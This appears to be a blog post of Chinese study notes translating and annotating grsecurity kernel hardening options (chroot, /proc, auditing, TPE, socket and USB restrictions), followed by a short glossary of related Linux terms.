&lt;p&gt;&lt;strong&gt;Allow special group&lt;/strong&gt; 【（GRKERNSEC_PROC_USERGROUP）如果选是，你可以选择一个组，这个组将可以查看所有进程的信息以及网络相关的信息。如果你启用了GRKERNSEC_HIDESYM选项，内核的标志信息可能依旧对这个组隐藏。 如果你想以非root身份运行identd，这将很有帮助。 你选择的组也可以在开机时通过”grsec_proc_gid=”在内核命令行选择。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;() GID for special group&lt;/strong&gt; 【（GRKERNSEC_PROC_GID）设置这个GID决定那个组将可以避免Grsecurity对/proc的限制，允许该特殊组的用户查看网络数据和其他用户进程的存在信息。该GID也可以在开机时通过”grsec_proc_gid=”参数在内核命令行设定。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Additional restrictions&lt;/strong&gt; 【（GRKERNSEC_PROC_ADD）如果选是，/proc将会添加附加的限制来阻止用户查看device和slabinfo信息（因为这些信息对exploits（渗透？）很有用）】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Linking restrictions&lt;/strong&gt; 【（GRKERNSEC_LINK、kernel.grsecurity.linking_restrictions）如果选是，race exploits将被阻止，因为在可写+t（world-write +t)的目录下（如/tmp)用户将不能再跟踪其他用户的符号链接，除非符号链接的所有者也是目录的所有者。 用户同样无法硬链接到不属于他们的文件上。如果sysctl被启用，一个名为”linking_restrictions”的sysctl选项被创建。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Kernel-enforced SymlinksIfOwnerMatch&lt;/strong&gt; 【？？？】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;（）GID for users with kernel-enforced SymlinksIfOwnerMatch&lt;/strong&gt; 【】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;FIFO restrictions&lt;/strong&gt; 【（GRKERNSEC_FIFO、kernel.grsecurity.fifo_restrictions） users will not be able to write to FIFOs they don’t own in world-writable +t directories (e.g. /tmp), unless the owner of the FIFO is the same owner of the directory it’s held in.】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Sysfs/debugfs restriction&lt;/strong&gt; 【（GRKERNSEC_SYSFS_RESTRICT）如果选是，在这个限制下正常挂载的sysfs以及所有在该目录下的文件系统都只能被root访问。		这些文件系统通常会提供硬件信息和调试信息的访问入口，然而这些信息却不适合被没有权限的用户看见。因为sysfs和debugfs也是一个潜在漏洞的最大的信息源ranging from infoleaks to local compromise.There has been very little oversight with an eye toward security involved in adding new exporters of information to these filesystems,所以不建议使用这些文件系统。 	因为兼容性的原因，一些目录对非root用户的访问提供了白名单：/sys/fs/selinux、/sys/fs/fuse、/sys/devices/system/cpu】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Runtime read-only mount protection&lt;/strong&gt; 【（GRKERNSEC_ROFS、kernel.grsecurity.romount_protect）如果选是，一个名为“romount_protect”的sysctl选项被产生。在运行时将这个选项设为1，文件系统将会获得如下保护：1、不允许新的可写入的加载的文件系统；2、现有的只读加载的文件系统不能被重新加载为可读可写；3、所有设备区块的写入选项都会被拒绝。 This option acts independently of grsec_lock: once it is set to 1, it cannot be turned off.		因此，如果该选项在只读系统的初始化脚本中被启用，请留意resulting behavior。		Also be aware that as with other root-focused features, GRKERNSEC_KMEM and GRKERNSEC_IO should be enabled and module loading disabled via config or at runtime.这个特性主要面向安全嵌入式系统（secure embedded systems）。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Eliminate stat/notify-based device sidechannels(（排除基于 进程状态/通知 的设备旁道攻击）&lt;/strong&gt; 【（GRKERNSEC_DEVICE_SIDECHANNEL）If you say Y here, timing analyses on block or character devices like /dev/ptmx using stat or inotify/dnotify/fanotify will be thwarted for unprivileged users. If a process without CAP_MKNOD stats such a device, the last access and last modify times will match the device’s create time. No access or modify events will be triggered through inotify/dnotify/fanotify for such devices。This feature will prevent attacks that may at a minimum allow an attacker to determine the administrator’s password length.】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Chroot jail restrictions&lt;/strong&gt; 【（GRKERNSEC_CHROOT）如果选是，你可以选择多个选项使突破chroot的限制更困难。如果在这些选项下没有不兼容的软件，建议你把每个都打开。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Deny mounts&lt;/strong&gt; 【（GRKERNSEC_CHROOT_MOUNT、kernel.grsecurity.chroot_deny_mount）如果选是，在chroot下的进程将不能再挂载或重新挂载文件系统】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Deny double-chroots&lt;/strong&gt; 【（GRKERNSEC_CHROOT_DOUBLE、kernel.grsecurity.chroot_deny_chroot）如果选是，在chroot下的进程不能再一次使用chroot。因为这个操作是打破chroot限制的普遍方法，不应该被允许。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Deny pivot_root in chroot&lt;/strong&gt; 【（GRKERNSEC_CHROOT_PIVOT、kernel.grsecurity.chroot_deny_pivot）如果选是，在chroot下的进程将不能使用pivot_root()方法，它就像会改变root文件系统的chroot in一样。这个方法可能在已经chroot的进程中被错误地使用来试图打破chroot限制，因此不该被允许。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Enforce chdir(“/“) on all chroots&lt;/strong&gt; 【（GRKERNSEC_CHROOT_CHDIR、kernel.grsecurity.chroot_enforce_chdir）如果选是，所有刚刚chroot的应用的当前工作目录都会被设定到chroot的根目录下。 因为目前所知这个特性不妨碍任何软件，建议你在这里选是。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Deny (f)chmod +s&lt;/strong&gt; 【（GRKERNSEC_CHROOT_CHMOD、kernel.grsecurity.chroot_deny_chmod）如果选是，在chroot下的进程将不能对文件使用chmod和fchmod来使它们具有SUID或SGID位。这特性保护chroot不被其他已公布的方法打破。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Deny fchdir and fhandle out of chroot&lt;/strong&gt; 【（GRKERNSEC_CHROOT_FCHDIR、kernel.grsecurity.chroot_deny_fchdir）如果选是，一个非常有名的打破chroot限制的方法将会被阻止，这个方法是fchdir’ing to a file descriptor of the chrooting process that points to a directory outside the filesystem.】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Deny mknod&lt;/strong&gt; 【（GRKERNSEC_CHROOT_MKNOD、kernel.grsecurity.chroot_deny_mknod）如果选是，在chroot下的进程将不能使用mknod命令。   在chroot使用mknod的问题是：这将允许攻击者生成一个device entry，就像在物理层次上获得你系统的root权限，which could range from anything from the console device to a device for your harddrive(which they could then use to wipe the drive or steal data).  建议选是，除非你运行的软件不兼容。	 如果sysctl可用，一个名为”chroot_deny_mknod”的选项将被创建。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Deny shmat() out of chroot&lt;/strong&gt; 【（GRKERNSEC_CHROOT_SHMAT、kernel.grsecurity.chroot_deny_shmat）如果选是，在chroot下的进程将不能连接到在chroot jail外创建的共享内存段。  建议在这里选是。 如果sysctl可用，一个名为”chroot_deny_shmat”的选项将被创建。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Deny access to abstract AF_UNIX sockets out of chroot&lt;/strong&gt; 【（GRKERNSEC_CHROOT_UNIX、kernel.grsecurity.chroot_deny_unix）如果选是，在chroot下的进程将不能连接到限制在chroot外部的abstract（表示不属于一个文件系统） Unix domain sockets.  建议选是。  如果sysctl可用，一个名为”chroot_deny_unix”的选项将被创建】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Protect outside processes&lt;/strong&gt; 【（GRKERNSEC_CHROOT_FINDTASK、kernel.grsecurity.chroot_findtask）如果选是，在chroot下的进程将不能杀死chroot外的进程，不能使用fcntl, ptrace, capget, getpgid, setpgid, getsid向chroot外的进程发送信号，不能查看chroot外的任何进程。	如果sysctl可用，一个名为”chroot_findtask”的选项将被创建】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Restrict priority changes&lt;/strong&gt; 【（GRKERNSEC_CHROOT_NICE、kernel.grsecurity.chroot_restrict_nice）如果选是，chroot下的进程将不能提升chroot下进程的优先级，或改变chroot外面的进程的优先级。	这个选项比从进程的能力设定中简单地删除CAP_SYS_NICE提供了更高的安全型。	如果sysctl可用，一个名为”chroot_restrict_nice”的选项将被创建】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Deny sysctl writes&lt;/strong&gt; 【（GRKERNSEC_CHROOT_SYSCTL、kernel.grsecurity.chroot_deny_sysctl）如果选是，在chroot下的攻击者将不能对sysctl的条目进行写入操作，不管是通过sysctl(2)还是通过/proc的接口。		强烈建议你在这个地方选是。如果sysctl可用，一个名为”chroot_sysctl”的选项将被创建】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Capability restrictions&lt;/strong&gt; 【（GRKERNSEC_CHROOT_CAPS、kernel.grsecurity.chroot_caps）如果选是，在chroot jail下的所有进程的性能都会被降低到关闭以下功能：模块插入、raw I/O、系统和网络服务管理、重启系统、修改immutable文件、修改其他用户的IPC和改变系统时间。留下这个选项是因为它可能破坏某些应用。如果你的chroot下的应用执行这些任务时出现了问题，那请禁用这个选项。		如果sysctl可用，一个名为”chroot_caps”的选项将被创建】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Exempt initrd tasks from restrictions&lt;/strong&gt; 【（GRKERNSEC_CHROOT_INITRD）如果选是，先前为了初始化而启动的tasks将可以免除Grsecurity的chroot限制。This option is mainly meant to resolve Plymouth’s performing privileged operations unnecessarily in a chroot.】&lt;/p&gt;

&lt;h3 id=&quot;kernel-auditing&quot;&gt;Kernel Auditing&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Single group for auditing&lt;/strong&gt; 【（GRKERNSEC_AUDIT_GROUP、kernel.grsecurity.audit_gid、kernel.grsecurity.audit_group）如果选是,the exec and chdir logging features将只在你选定的组里面运作。	如果你只是想看特定的用户而不是系统大量的logs，这个选项建议启用。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;GID for auditing&lt;/strong&gt; 【GRKERNSEC_AUDIT_GID】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Exec logging&lt;/strong&gt; 【（GRKERNSEC_EXECLOG、kernel.grsecurity.exec_logging）如果选是，所有execve()调用都会被记录。对shell-servers的好处是保持对用户的跟踪。		如果sysctl可用，一个名为”exec_logging”的选项将被创建。	警告：这个选项启用时会产生大量的日志，特别是在活动的系统。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Resource logging&lt;/strong&gt; 【（GRKERNSEC_RESLOG、kernel.grsecurity.resource_logging）如果选是，所有超越resource限制的意图都将随着resource的名字、请求资源的大小和目前的限制被记录。高度建议你在这里选Y。如果sysctl可用，一个名为”resource_logging”的选项将被创建。如果RBAC系统也可用，这个sysctl选项的值将被忽略。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Log execs within chroot&lt;/strong&gt; 【（GRKERNSEC_CHROOT_EXECLOG、kernel.grsecurity.chroot_execlog）如果选是，在chroot中的所有执行都将被记录在syslog上。如果特定的程序已安装在系统上，这会产生大量的日志。  因此留下了这个选项。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Ptrace logging&lt;/strong&gt; 【（GRKERNSEC_AUDIT_PTRACE、kernel.grsecurity.audit_ptrace）如果选是，所有通过ptrace连接进程的意图都将被记录。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Chdir logging&lt;/strong&gt; 【（GRKERNSEC_AUDIT_CHDIR、kernel.grsecurity.audit_chdir）如果选是，所有chdir()调用都会被记录。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;(Un)Mount logging&lt;/strong&gt; 【（GRKERNSEC_AUDIT_MOUNT、kernel.grsecurity.audit_mount）如果选是，所有挂载和卸载都会被记录。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Signal logging&lt;/strong&gt; 【（GRKERNSEC_SIGNAL、kernel.grsecurity.signal_logging）如果选是，特定的重要信息（如SIGSEGV）将被记录，当进程发生一个错误时它会作为一个结果通知你，这在一定程度上可能意味着a possible exploit attempt。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Fork failure logging&lt;/strong&gt; 【（GRKERNSEC_FORKFAIL、kernel.grsecurity.forkfail_logging）所有失败的fork()尝试都会被记录。这可能意味着fork炸弹，或有人正试图是他们的程序越权。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Time change logging&lt;/strong&gt; 【（GRKERNSEC_TIME、kernel.grsecurity.timechange_logging）所有系统时钟的改变都将被记录】&lt;/p&gt;

&lt;p&gt;**/proc/&lt;pid&gt;/ipaddr support** 【（GRKERNSEC_PROC_IPADDR）如果选是，一个包含用户IP地址的新条目将会被加在每个/proc/&lt;pid&gt;目录下。The IP is carried across local TCP and AF_UNIX stream sockets.This information can be useful for IDS/IPSes to perform remote response to a local attack.这个条目只能被进程的所有者看见（root用户也能看见，如果他拥有CAP_DAC_OVERRIDE。这可以通过RBAC系统删除。）因此不会产生相关的隐私】&lt;/pid&gt;&lt;/pid&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Denied RWX mmap/mprotect logging&lt;/strong&gt; 【（GRKERNSEC_RWXMAP_LOG、kernel.grsecurity.rwxmap_logging）如果选是，当被PAX_MPROTECT阻止时，calls to mmap() and mprotect() with explicit usage of PROT_WRITE and PROT_EXEC together将会被记录。 这个feature也会记录其他的当PAX_MPROTECT开启时可能有问题的方案，比如textrels and PT_GNU_STACK】&lt;/p&gt;

&lt;h3 id=&quot;executable-protections&quot;&gt;Executable Protections&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Dmesg(8) restriction&lt;/strong&gt; 【（GRKERNSEC_DMESG、kernel.grsecurity.dmesg）如果选是，非root用户将无法使用dmesg命令查看内核环日志缓冲。内核日志缓冲经常包含有内核地址和其他对攻击者有用的标识信息，in fingerprinting（数字指纹） a system for a targeted exploit。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Deter ptrace-based process snoopin&lt;/strong&gt; 【（GRKERNSEC_HARDEN_PTRACE、kernel.grsecurity.harden_ptrace）如果选是，通过ptrace实现的tty嗅探程序和其他恶意监督程序将被阻止。如果你一直使用着RBAC系统，所有用户的这个选项已经启用了好几年了，with the ability to make fine-grained（细粒度？） exceptions. This option only affects the ability of non-root users to ptrace processes that are not a descendent（子孙进程） of the ptracing process. This means that strace ./binary and gdb ./binary will still work, but attaching to arbitrary processes will not.】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Require read access to ptrace sensitive binaries&lt;/strong&gt; 【（GRKERNSEC_PTRACE_READEXEC、kernel.grsecurity.ptrace_readexec）如果选是，没有权限的用户将不能ptrace不可读的二进制程序。这个选项对在移除了有suid的二进制程序的可读权限后的环境很有用——可防止内容泄露。  这个选项增加了这种文件使用的稳定性，因为当没有选先下执行且ptracing时，二进制程序能被正常地读取。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Enforce consistent multithreaded privileges&lt;/strong&gt; 【（GRKERNSEC_SETXID、kernel.grsecurity.consistent_setxid）If you say Y here, a change from a root uid to a non-root uid in a multithreaded application will cause the resulting uids, gids, supplementary(增补的） groups, and capabilities in that thread to be propagated（传送，扩散） to the other threads of the process.  在大多数情况下这是不必要的，因为glibc在应用程序的维护上会仿真这个行为。  其他的libc不会做同样的事情——允许进程的其他线程以root权限继续运行。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Disallow access to overly-permissive（过分宽松） IPC objects&lt;/strong&gt; 【（GRKERNSEC_HARDEN_IPC、kernel.grsecurity.harden_ipc)如果选是，过分宽松的IPC对象通道（共享内存、队列信息和信号量）将被禁止，进程将在正常权限下加入以下准则检查：1、If the IPC object is world-accessible and the euid doesn’t match that of the creator or current uid for the IPC object（IPC对象是否可访问以及euid是否与创建者或现在IPC对象的uid不匹配） 2、If the IPC object is group-accessible and the egid doesn’t match that of the creator or current gid for the IPC object。  [It’s a common error to grant too much permission to these objects, with impact ranging from denial of service and information leaking to privilege escalation.]&lt;em&gt;（授予这些对象太多权限是一个常见的错误，权限的提高可能导致拒绝服务和信息泄露）&lt;/em&gt;。  拥有CAP_IPC_OWNER属性的进程仍然可以access these IPC objects.】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Trusted Path Execution (TPE)&lt;/strong&gt; 【（GRKERNSEC_TPE、kernel.grsecurity.tpe、kernel.grsecurity.tpe_gid）如果选是，你将可以选择一个GID加入增补的组中，里面的成员都被标记为”untrusted.”这些用户将不能执行在只有root能写入的但不属于root用户的目录中的所有文件。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Partially restrict（局部限制） all non-root users&lt;/strong&gt; 【（GRKERNSEC_TPE_ALL、kernel.grsecurity.tpe_restrict_all）如果选是，所有非root用户都将在一个削弱的TPE限制下。 This is separate from, and in addition to, the main TPE options that you have selected elsewhere.&lt;em&gt;（与你在别处选择的TPE选项有区别，并且效果叠加？）&lt;/em&gt;  因此，如果一个”trusted” GID被选择，这个限制同样会应用在这个GID上。 Under this restriction, all non-root users will only be allowed to execute files in directories they own that are not group or world-writable, or in directories owned by root and writable only by root.&lt;em&gt;（在这个限制下，所有非root用户只被允许执行属于他们自己 并且==不是==一个组或可写入的目录、或属于root且只能被root写入的目录下的文件。）&lt;/em&gt;】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Invert（反转？） GID option&lt;/strong&gt; 【（GRKERNSEC_TPE_INVERT、kernel.grsecurity.tpe_invert）如果选是，the group you specify in the TPE configuration will decide what group TPE restrictions will be &lt;em&gt;disabled&lt;/em&gt; for.&lt;em&gt;（你在TPE配置中指定的组将判断那些TPE组限制将会被禁用）&lt;/em&gt;  如果你想TPE限制应用在大多数用户上，这个选项很有用。  Unlike other sysctl options, this
entry will default to on for backward-compatibility.】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;GID for TPE-untrusted users&lt;/strong&gt; 【（GRKERNSEC_TPE_UNTRUSTED_GID）Setting this GID determines what group TPE restrictions will be &lt;em&gt;enabled&lt;/em&gt; for.】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;GID for TPE-trusted users&lt;/strong&gt; 【（GRKERNSEC_TPE_TRUSTED_GID）Setting this GID determines what group TPE restrictions will be &lt;em&gt;disabled&lt;/em&gt; for.】&lt;/p&gt;

&lt;h3 id=&quot;network-protections&quot;&gt;Network Protections&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Larger entropy pools&lt;/strong&gt; 【（GRKERNSEC_RANDNET）如果选是，用来存放Linux和Grsecurity的各种features的entropy pool的大小会翻倍。由于有些Grsecurity的features使用附加的随机性，所有建议你在这里选是——相当于修改/proc/sys/kernel/random/poolsize】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;TCP/UDP blackhole and LAST_ACK DoS(Denial of Service, 拒绝服务攻击)prevention&lt;/strong&gt; 【（GRKERNSEC_BLACKHOLE、kernel.grsecurity.ip_blackhole、kernel.grsecurity.lastack_retries）如果选是，当外来数据包发送到没有程序监听的端口上，TCP重置和ICMP目标不可达数据包都不会被发送来相应该外来数据包。这个features支持IPV4和IPV6并且可以绕过回环网卡避免转发到黑洞。启用这个选项是主机对DoS攻击变得更有适应力（更主动），还能减少对扫瞄者的可视度。  这里的blackhole features实现相当于FreeBSD的blackhole feature，它对所有数据包不只是SYNs阻止RST（reset）响应。  在大多数程序执行下这不会造成问题，但程序（如haproxy）可能不会通过在远程端干净得终止他们来关闭特定的连接，从而让远程主机停留在LAST_ACK状态。 Because of this side-effect and to prevent intentional LAST_ACK DoSes,所有这个特性也增加automatic mitigation来应对这类攻击。  这个mitigation大幅度地减少一个socket花费在LAST_ACK state的时间。 如果你正使用haproxy并且不是所有的正连接的服务器都启用了这个选项，那在haproxy主机上禁用这个选项。  如果sysctl可用，两个名为”ip_blackhole” and “lastack_retries”的选项将被产生。当ip_blackhole进行标准的 0/非0、开/关 切换时，lastack_retries使用相同的值（”tcp_retries1” and “tcp_retries2”）。 默认的值 4 阻止一个socket保持LAST_ACK状态45秒。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Disable TCP Simultaneous（同时的） Connect&lt;/strong&gt; 【（GRKERNSEC_NO_SIMULT_CONNECT）如果选是，该特性将移除Linux的strict implementation of TCP的缺点——允许两个没有均进入监听状态的client相互连接。这个缺点可以让一个攻击者很容易地阻止一个client连接上一个已知的一提供正确连接端口的服务器。  因为这个缺点可能被用来阻止杀毒软件或者IPS from fetching updates，或者阻止SSL网关获取CRL，因此这个弱点应该通过启用这个选项除去。  虽然Linux是为数不多的支持同时连接的操作系统之一，当这在现实中没有合理的用途，并且缺少防火墙的支持。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Socket restrictions&lt;/strong&gt; 【（GRKERNSEC_SOCKET）如果选是，你可以选择以下几个选项。如果你在你的系统上分配一个GID并且把它作为额外的用户组——你希望限制其中的用户对socket的访问，这个patch将表现为基于你的选项表现为三种状态。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Deny any sockets to group&lt;/strong&gt; 【（GRKERNSEC_SOCKET_ALL、kernel.grsecurity.socket_all、kernel.grsecurity.socket_all_gid）如果选是，你可以选择一个GID，这个组里的用户都将不能通过该机器连接到其他主机上或在该机器上运行服务端应用。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;GID to deny all sockets for&lt;/strong&gt; 【（GRKERNSEC_SOCKET_ALL_GID）在这里你可以选择一个禁止socket访问功能的GID，要记得在这个组添加你想要禁止socket访问功能的用户。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Deny client sockets to group&lt;/strong&gt; 【（GRKERNSEC_SOCKET_CLIENT、kernel.grsecurity.socket_client、kernel.grsecurity.socket_client_gid）如果选是，你可以选择一个GID，这个组里的用户都将不能通过该机器连接到其他主机上，但可以运行服务。 如果这个选项启用，当你的机器在shell中启动ftp transfers时，所有在这个组里的用户将必须使用passive mode（被动模式？）】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;GID to deny client sockets for&lt;/strong&gt; 【（GRKERNSEC_SOCKET_CLIENT_GID）在这里你可以选择一个禁止socket访问功能的GID，要记得在这个组添加你想要禁止socket访问功能的用户。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Deny server sockets to group&lt;/strong&gt; 【（GRKERNSEC_SOCKET_SERVER、kernel.grsecurity.socket_server、kernel.grsecurity.socket_server_gid）如果选是，你可以选择一个GID，这个组里的用户都将不能在该机器上运行服务端应用。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;GID to deny server sockets for&lt;/strong&gt; 【（GRKERNSEC_SOCKET_SERVER_GID）在这里你可以选择一个禁止socket访问功能的GID，要记得在这个组添加你想要禁止socket访问功能的用户。】&lt;/p&gt;

&lt;h3 id=&quot;physical-protections&quot;&gt;Physical Protections&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Deny new USB connections after toggle&lt;/strong&gt; 【（GRKERNSEC_DENYUSB、kernel.grsecurity.deny_new_usb）如果选是，一个新的名为”deny_new_usb”的sysctl选项将被生成。 将这个选项设为1将阻止任何被
OS识别的新的USB设备。所有USB设备的插入记录都会被记录。  这个选项被用来在各种USB设备中阻止被设计为渗透漏洞的USB。  为了最大的效益，在相关的启动脚本执行后这个sysctl应该被设置。  这个选项在发行版中是安全的，因为每一个用户都可以选择是否切换这个sysctl。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Reject all USB devices not connected at boot&lt;/strong&gt; 【（GRKERNSEC_DENYUSB_FORCE）如果选是，一个将不生成sysctl项目的GRKERNSEC_DENYUSB的变型会被启用。这个选项应该只在你确定要拒绝所有运行时的USB连接、并且不再改变初始化脚本时才启用。 这个选项不应该被distros启用。 It forces the core USB code to be built into the kernel image so that all devices connected at boot time can be recognized and new USB device connections can be prevented prior to init running.】&lt;/p&gt;

&lt;h3 id=&quot;sysctl-support&quot;&gt;Sysctl Support&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Sysctl support&lt;/strong&gt; 【（GRKERNSEC_SYSCTL）如果选是，你可以改变Grsecurity的开机选项，而不用重新编译内核。  你可以echo 变量的值到/proc/sys/kernel/grsecurity目录来开启（1）或禁用（0）各种features。所有sysctl条目都是可变的只要”grsec_lock”条目被设置成非0值。  如果你没有在开机时对”Turn on features by default”选项选是，所有内核配置中可用的feature都将不可用。  所有选项应被设置为startup，并且当所有选项设置好后grsec_lock应该被设置成非零值。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Extra sysctl support for distro（发行版） makers (READ HELP)&lt;/strong&gt; 【（GRKERNSEC_SYSCTL_DISTRO）如果选是，将会生成附加的sysctl选项用来控制针对root下运行进程的features。因此，当grsec_lock在开机后被启用了，使用这个选项很重要。    Only distros with prebuilt kernel packages with this option enabled that can ensure grsec_lock is enabled after boot should use this option.  &lt;em&gt;Failure to set grsec_lock after boot makes all grsec features this option covers useless&lt;/em&gt; 。目前这个选项生成如下sysctl项目：”Disable Privileged I/O”: “disable_priv_io”】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Turn on features by default&lt;/strong&gt; 【（GRKERNSEC_SYSCTL_ON）如果选是，所有内核配置选项中选用的features都会在开机时被启用。 建议你选是，除非因为某些原因你想默认禁用所有sysctl可调的features。  就像其他地方提到的，在你完成对sysctl项目的修改之后启用grsec_lock项目非常重要。】&lt;/p&gt;

&lt;h3 id=&quot;logging-options&quot;&gt;Logging Options&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Seconds in between log messages (minimum)&lt;/strong&gt; 【（GRKERNSEC_FLOODTIME）这个选项允许你设定Grsecurity生成日志的时间。默认选项应该适合大多数人，如果你要更改它，选择一个足够小的数来允许生成能提供信息的日志，但赢足够大已防止泛洪。  设定这个值并且将GRKERNSEC_FLOODBURST设为0，能防止Grsecurity日志的任何rate limiting（极限概率？）】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Number of messages in a burst (maximum)&lt;/strong&gt; 【（GRKERNSEC_FLOODBURST）This option allows you to choose the maximum number of messages allowed within the flood time interval you chose in a separate option.  默认选项应该适合大多数人, 然而，如果你发现你的许多日志被解释为flooding，你可能需要提高这个值。Setting both this value and GRKERNSEC_FLOODTIME to 0 will disable any rate limiting on grsecurity log messages.】&lt;/p&gt;

&lt;h2 id=&quot;section&quot;&gt;知识索引&lt;/h2&gt;

&lt;p&gt;1、TPE:Tursted Path Execution， 是Linux内核模块。
【Trusted Path Execution (TPE) is a feature that basically denies users the ability to execute programs that are not owned by the root user, or that they can write to. This prevents all kinds of exploits（漏洞利用程序） that would have otherwise rooted your system.】&lt;/p&gt;

&lt;p&gt;2、MPROTECT：
【The goal of MPROTECT is to help prevent the introduction of new executable code into the task’s address space. This is accomplished by restricting the mmap() and mprotect() interfaces.】
   The restrictions prevent
   - creating executable anonymous mappings
   - creating executable/writable file mappings
   - making an executable/read-only file mapping writable except for performing
     relocations on an ET_DYN ELF file (non-PIC shared library)
   - making a non-executable mapping executable&lt;/p&gt;

&lt;p&gt;3、PTE( page table entries， 页表项)&lt;/p&gt;

&lt;p&gt;4、NX（No Excute， 不可执行）&lt;/p&gt;

&lt;p&gt;5、ASLR（Address space layout randomization） 【是一种针对缓冲区溢出的安全保护技术，通过对堆、栈、共享库映射等线性区布局的随机化，通过增加攻击者预测目的地址的难度，防止攻击者直接定位攻击代码位置，达到阻止溢出攻击的目的。】&lt;/p&gt;

&lt;p&gt;6、kexec 【kexec 是 Linux 内核的一个补丁，让您可以从当前正在运行的内核直接引导到一个新内核。在上面描述的引导序列中，kexec 跳过了整个引导装载程序阶段（第一部分）并直接跳转到我们希望引导到的内核。不再有硬件的重启，不再有固件操作，不再涉及引导装载程序。完全避开了引导序列中最弱的一环 – 固件。这一功能部件带来的最大益处在于，系统现在可以极其快速地重新启动。】&lt;/p&gt;

&lt;p&gt;7、Linux下设置端口权限的系统调用:
ioperm 【为调用进程设置I/O端口访问权能。ioperm的使用需要具有超级用户的权限，只有低端的[0-0x3ff] I/O端口可被设置，要想指定更多端口的权能，可使用iopl函数。这一调用只可用于i386平台。】&lt;/p&gt;

&lt;p&gt;iopl 【该调用用于修改当前进程的操作端口的权限。可以用于所有65536个端口的权限。因此，ioperm相当于该调用的子集。和ioperm一样，这一调用仅适用于i386平台。】&lt;/p&gt;

&lt;p&gt;8、hwclock 【用来显示与设定硬件时钟。在Linux中有硬件时钟与系统时钟等两种时钟。硬件时钟是指主机板上的时钟设备，也就是通常可在BIOS画面设定的时钟。系统时钟则是指kernel中的时钟。当Linux启动时，系统时钟会去读取硬件时钟的设定，之后系统时钟即独立运作。所有Linux相关指令与函数都是读取系统时钟的设定。】&lt;/p&gt;

&lt;p&gt;9、shmat(把共享内存区对象映射到调用进程的地址空间)：连接共享内存标识符为shmid的共享内存，连接成功后把共享内存区对象映射到调用进程的地址空间，随后可像本地空间一样访问&lt;/p&gt;

&lt;p&gt;10、dmesg 【dmesg用来显示开机信息，kernel会将开机信息存储在ring buffer中。若是开机时来不及查看信息，可利用dmesg来查看。开机信息亦保存在/var/log目录中，名称为dmesg的文件里。】&lt;/p&gt;

&lt;p&gt;11、ptrace 【ptrace提供了一种使父进程得以监视和控制其它进程的方式，它还能够改变子进程中的寄存器和内核映像，因而可以实现断点调试和系统调用的跟踪。】&lt;/p&gt;

&lt;p&gt;12、ACK 【ACK (Acknowledgement），即确认字符，在数据通信中，接收站发给发送站的一种传输类控制字符。表示发来的数据已确认接收无误。在TCP/IP协议中，如果接收方成功的接收到数据，那么会回复一个ACK数据。通常ACK信号有自己固定的格式,长度大小,由接收方回复给发送方。其格式取决于采取的网络协议。当发送方接收到ACK信号时，就可以发送下一个数据。如果发送方没有收到信号，那么发送方可能会重发当前的数据包，也可能停止传送数据。具体情况取决于所采用的网络协议。】&lt;/p&gt;

&lt;p&gt;13、IPC 【Inter-Process Communication，进程间通信】&lt;/p&gt;
</description>
